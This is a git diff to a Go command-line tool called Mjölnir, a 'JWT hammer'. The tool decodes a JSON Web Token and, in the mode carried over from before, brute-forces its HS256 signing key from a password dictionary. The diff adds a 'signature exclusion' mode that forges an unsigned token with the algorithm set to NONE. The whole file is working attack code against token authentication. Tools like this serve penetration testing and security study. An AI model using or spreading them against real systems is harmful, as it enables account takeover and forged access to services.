@@ -12,27 +12,39 @@ import (
 	"time"
 
 	"github.com/dgrijalva/jwt-go"
+	"github.com/fatih/color"
+)
+
+var (
+	version = "v1.1"
 )
 
 func main() {
 	jwtFlag := flag.String("jwt", "", "The JWT token")
-	dicFlag := flag.String("dict", "", "The password dictionary")
+	dicFlag := flag.String("dict", "", "The password dictionary for brute force attack")
+	excFlag := flag.Bool("exclude", false, "Signature exclusion attack")
 	flag.Parse()
+
+	yellow := color.New(color.FgYellow).SprintFunc()
+	green := color.New(color.FgGreen).SprintFunc()
+	blue := color.New(color.FgBlue).SprintFunc()
+	red := color.New(color.FgRed).SprintFunc()
 
 	log.SetOutput(os.Stdout)
 	log.SetFlags(0)
 
-	if *jwtFlag == "" || *dicFlag == "" {
+	if *jwtFlag == "" {
 		flag.Usage()
 		return
 	}
 
-	log.Println("\n[*] Starting Mjölnir the JWT hammer.")
+	log.Println("")
+	log.Printf(green("[=]")+" Starting Mjölnir %s the JWT hammer.", version)
 
 	jwtArr := strings.Split(*jwtFlag, ".")
 
 	if len(jwtArr) != 3 {
-		log.Fatal("[!] Not a JWT token")
+		log.Fatal(red("[!]") + " Not a JWT token")
 		return
 	}
 
@@ -40,40 +52,52 @@ func main() {
 	data, _ := jwt.DecodeSegment(jwtArr[1])
 	signature, _ := jwt.DecodeSegment(jwtArr[2])
 
-	log.Printf("[+] Header:    %s", header)
-	log.Printf("[+] Data:      %s", data)
-	log.Printf("[+] Signature: %x", signature)
+	log.Println(blue("[+]") + " JWT info:")
+	log.Printf(blue("[+]")+" Header:    %s", header)
+	log.Printf(blue("[+]")+" Data:      %s", data)
+	log.Printf(blue("[+]")+" Signature: %x", signature)
 
-	// Set the payload
-	payload := jwtArr[0] + "." + jwtArr[1]
-	log.Printf("[+] Payload:  %s", payload)
+	if *dicFlag != "" {
+		// Set the payload
+		payload := jwtArr[0] + "." + jwtArr[1]
+		log.Printf(blue("[+]")+" Payload:  %s", payload)
 
-	// Load password dictionary
-	log.Println("[*] Loading dictionary")
-	file, err := ioutil.ReadFile(*dicFlag)
-	if err != nil {
-		log.Fatalf("[!] %s", err.Error())
-	}
-	passwds := strings.Split(string(file), "\n")
-
-	// Bruteforce the password
-	then := time.Now()
-
-	var passOk string
-	log.Println("[*] Starting bruteforce, this can be slow, be patient")
-	for _, pwd := range passwds {
-		if hs256Calculator([]byte(payload), signature, []byte(pwd)) {
-			passOk = pwd
-			break
+		// Load password dictionary
+		log.Println(yellow("[*]") + " Loading dictionary")
+		file, err := ioutil.ReadFile(*dicFlag)
+		if err != nil {
+			log.Fatalf(red("[!]")+" %s", err.Error())
 		}
+		passwds := strings.Split(string(file), "\n")
+
+		// Bruteforce the password
+		then := time.Now()
+
+		var passOk string
+		log.Println(yellow("[*]") + " Starting bruteforce, this can be slow, be patient")
+		for _, pwd := range passwds {
+			if hs256Calculator([]byte(payload), signature, []byte(pwd)) {
+				passOk = pwd
+				break
+			}
+		}
+
+		now := time.Now().Sub(then).String()
+		if passOk != "" {
+			log.Printf(green("[=]")+" Key found in %s, the key is %s", now, passOk)
+		} else {
+			log.Printf(red("[!]")+" Password not found after running for %s :(", now)
+		}
+
+		return
+	} else if *excFlag {
+		header := jwt.EncodeSegment([]byte("{\"alg\":\"NONE\",\"typ\":\"JWT\"}"))
+		token := header + "." + jwtArr[1] + "."
+		log.Printf(green("[=]")+" New token w/o signature: %s", token)
+		return
 	}
 
-	now := time.Now().Sub(then).String()
-	if passOk != "" {
-		log.Printf("[!] Key found in %s, the key is %s", now, passOk)
-	} else {
-		log.Printf("[!] Password not found after running for %s :(", now)
-	}
+	log.Println(red("[!]") + " No attack specified")
 }
 
 func hs256Calculator(payload, signature, password []byte) bool {
